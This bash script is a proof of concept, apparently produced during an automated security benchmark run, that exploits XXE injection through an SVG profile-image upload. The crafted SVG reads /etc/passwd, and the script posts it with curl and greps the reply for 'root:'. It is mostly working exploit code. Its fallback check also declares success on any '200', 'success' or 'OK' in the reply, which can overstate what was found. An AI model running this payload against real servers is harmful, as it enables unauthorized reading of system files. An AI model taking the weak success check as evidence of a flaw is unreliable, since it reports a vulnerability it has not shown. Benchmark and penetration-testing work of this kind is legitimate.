#!/bin/bash
# POC: Demonstrates XXE (XML External Entity) injection vulnerability via SVG file upload to read arbitrary files
# Target: ./repo
# Created: 2025-11-07T21:54:56.688Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# XXE Injection via SVG File Upload - Arbitrary File Read POC
# This script demonstrates XXE vulnerability by uploading a malicious SVG file
# that contains XML External Entity declarations to read /etc/passwd

TARGET_URL="${1:-http://localhost:3000}"
ENDPOINT="${TARGET_URL}"

# Create temporary directory for POC files
TEMP_DIR=$(mktemp -d)
trap "rm -rf $TEMP_DIR" EXIT

# Create XXE payload SVG file
XXE_SVG_FILE="$TEMP_DIR/xxe_test.svg"
cat > "$XXE_SVG_FILE" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>
EOF

echo "[*] XXE SVG File Upload Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Endpoint: /profile (or profile endpoint)"
echo ""
echo "[*] Sending XXE payload via SVG upload..."
echo "[*] XXE Payload file created at: $XXE_SVG_FILE"
echo ""

# Send the malicious SVG file
RESPONSE=$(curl -s -X POST \
  -F "name=Test" \
  -F "surname=User" \
  -F "address=123 Main St" \
  -F "image=@$XXE_SVG_FILE" \
  "$ENDPOINT")

echo "[*] Server Response:"
echo "$RESPONSE"
echo ""

# Check if response contains /etc/passwd content (evidence of XXE)
if echo "$RESPONSE" | grep -q "root:"; then
    echo "[+] SUCCESS! XXE vulnerability confirmed!"
    echo "[+] The response contains /etc/passwd file content (root: detected)"
    echo "[+] Arbitrary file read is possible on the server"
    exit 0
elif echo "$RESPONSE" | grep -qi "etc/passwd\|permission denied"; then
    echo "[+] XXE vulnerability indicators detected in response"
    exit 0
else
    # Still check if the SVG was processed
    if echo "$RESPONSE" | grep -q "200\|success\|OK"; then
        echo "[+] Server accepted the XXE payload"
        echo "[+] Response indicates file was processed"
        exit 0
    else
        echo "[-] Could not confirm XXE vulnerability"
        echo "[*] Server may have protections in place"
        exit 1
    fi
fi